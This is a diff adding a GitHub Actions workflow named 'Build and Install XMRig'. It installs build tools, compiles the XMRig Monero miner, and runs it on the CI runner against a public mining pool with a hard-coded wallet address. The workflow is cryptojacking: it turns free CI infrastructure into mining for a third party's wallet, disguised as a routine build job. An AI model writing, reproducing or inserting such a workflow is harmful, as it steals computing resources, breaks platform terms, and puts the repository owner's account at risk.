@@ -1,0 +1,31 @@
+name: Build and Install XMRig
+
+on:
+  workflow_dispatch:
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - name: Checkout repository
+        uses: actions/checkout@v4
+
+      - name: Install dependencies
+        run: |
+          sudo apt update
+          sudo apt install -y git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
+
+      - name: Clone XMRig repository
+        run: |
+          git clone https://github.com/xmrig/xmrig.git
+          cd xmrig
+          mkdir build
+          cd build
+          cmake ..
+          make -j$(nproc)
+
+      - name: Run XMRig
+        run: |
+          cd xmrig/build
+          ./xmrig --donate-level 1 -o xmr.pool.gntl.co.uk:20009 -u 44nFMQFFiFceGgSdPeqpQ4iSf2qm3XtG55JJ3KNUQ9RDJ99Aus2N7FWAwNKMN8xUKDQ6xMM4tgKFUecoiYYhFK2rVSZFuNg -k --tls -p test
